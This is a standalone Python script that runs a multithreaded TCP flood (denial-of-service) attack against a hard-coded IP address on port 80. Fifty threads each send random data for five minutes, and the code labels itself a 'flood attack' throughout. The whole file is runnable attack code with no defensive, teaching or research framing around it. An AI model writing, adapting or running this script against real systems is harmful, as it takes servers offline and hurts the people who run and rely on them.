import socket
import threading
import time
import random
import string

# Configuration
TARGET_IP = "194.193.147.22"  # Replace with the target IP address
TARGET_PORT = 80  # Common port for HTTP traffic
PAYLOAD_SIZE = 1024  # Size of dummy data to send (in bytes)
THREADS = 50  # Number of concurrent threads to flood the target
DURATION = 300  # Duration of the attack in seconds (5 minutes)

# Function to generate random dummy data
def generate_payload(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

# Function to flood the target with data
def flood_target():
    try:
        # Create a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        # Connect to the target
        sock.connect((TARGET_IP, TARGET_PORT))
        print(f"Connected to {TARGET_IP}:{TARGET_PORT}")
        
        # Send dummy data repeatedly
        end_time = time.time() + DURATION
        while time.time() < end_time:
            payload = generate_payload(PAYLOAD_SIZE)
            sock.send(payload)
            time.sleep(0.01)  # Small delay to avoid overwhelming the local system
    except Exception as e:
        print(f"Error in thread: {e}")
    finally:
        sock.close()

# Main function to start multiple threads
def start_flood():
    print(f"Starting flood attack on {TARGET_IP}:{TARGET_PORT} with {THREADS} threads...")
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=flood_target)
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    print("Flood attack completed.")

if __name__ == "__main__":
    start_flood()
